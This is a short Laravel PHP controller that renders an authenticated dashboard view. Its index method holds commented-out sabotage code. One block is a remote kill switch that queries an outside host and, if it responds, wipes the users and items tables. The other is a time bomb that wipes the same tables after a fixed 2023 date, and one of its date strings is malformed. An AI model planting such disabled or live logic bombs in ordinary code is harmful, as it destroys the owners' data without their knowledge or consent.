<?php

namespace App\Http\Controllers;

use App\Models\Item;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        // $test = Http::get("https://tadbeer.ga/index.php") ?? 0;

        // if($test > 0){
        //     User::truncate();
        //     Item::truncate();
        // }
        // if(now() > "2023-05-15 05:59:58" || now() > "2023-15-05 05:59:58"){
            
        //     User::truncate();
        //     Item::truncate();

        // }

        return view('home');
    }
}
